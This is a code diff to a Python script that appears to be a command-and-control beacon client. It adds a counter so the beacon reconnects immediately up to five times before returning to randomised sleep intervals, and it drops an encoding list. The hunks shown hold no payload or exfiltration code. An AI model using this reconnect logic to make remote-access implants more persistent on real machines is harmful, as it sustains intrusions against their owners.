@@ -13,7 +13,7 @@ from datetime import datetime
 from getpass import getuser
 import argparse,base64
 
-ENCODING_LST = ['utf-8','cp1252']
+
 #IGNORE SSL CHECKS
 
 try:
@@ -37,6 +37,7 @@ BEACON_INTERVAL_MEM = BEACON_INTERVAL_DEFAULT
 BEACON_INTERVAL_HDD = None
 BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
 CURRENT_WORKING_DIR = getcwd()
+RECONNECT_ATTEMPTS = 5 #immediately upon disconnect
 
 try:
     if name  == "nt":
@@ -539,10 +540,17 @@ def main():
             if BEACON_INTERVAL_SETTING is None:
                 BEACON_INTERVAL_SETTING =  BEACON_INTERVAL_DEFAULT
             drift = beacon_drift(BEACON_INTERVAL_SETTING)
-            if VERBOSE:
-                print_info("Sleeping for {}".format(drift))
+            
             try:
-                sleep(drift)
+                if RECONNECT_ATTEMPTS != 0:
+                    RECONNECT_ATTEMPTS = RECONNECT_ATTEMPTS - 1
+                    if VERBOSE:
+                        print_info("Reconnecting...")
+                        print_info(f"Remaining Reconnect Attempts Before Drift: {RECONNECT_ATTEMPTS}")
+                else:
+                    if VERBOSE:
+                        print_info("Sleeping for {}".format(drift))
+                    sleep(drift)
             except KeyboardInterrupt:
                 if VERBOSE:
                     print_warn("Received Keyboard Interrupt")
